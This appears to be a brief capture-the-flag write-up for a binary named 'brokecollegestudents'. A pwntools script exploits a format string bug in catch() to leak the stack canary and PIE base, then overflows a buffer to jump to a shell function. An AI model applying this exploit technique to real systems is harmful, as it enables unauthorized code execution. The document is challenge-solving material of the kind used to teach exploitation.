### There is a format string vulnerability in the catch() function. Also, PIE is enabled and there is a stack canary We can exploit the format string vulnerability to leak the stack canary and the base address of the elf
```
#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./brokecollegestudents")
context.log_level = "debug"
p = process("./brokecollegestudents")
#gdb.attach(p)
def initRecv():
    p.sendlineafter("Choice: ","1")
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("1")

initRecv()

# Leaking the Stack Canary
p.sendlineafter("name","%9$p")
for i in range(2):
    p.recvline()
leak = p.recvuntil("What").decode()[:-4]
canary = hex(int(leak,16))
log.info("Canary: {}".format(canary))
canary = int(canary,16)
initRecv()

#Leaking the base address of ELF
# I found this fmt payload after lots of debugging.
p.sendlineafter("name","%28$p")
for i in range(2):
    p.recvline()
leak = p.recvuntil("What").decode()[:-4]

leak = int(leak,16)
elf.address = leak-0x18f6
log.info("elf base address: {}".format(hex(elf.address)))
initRecv()
shell = elf.address + 0x14ec
payload = b'a'*24 + p64(canary) + b'a'*8+p64(shell)
p.sendline(payload)
p.interactive()
```
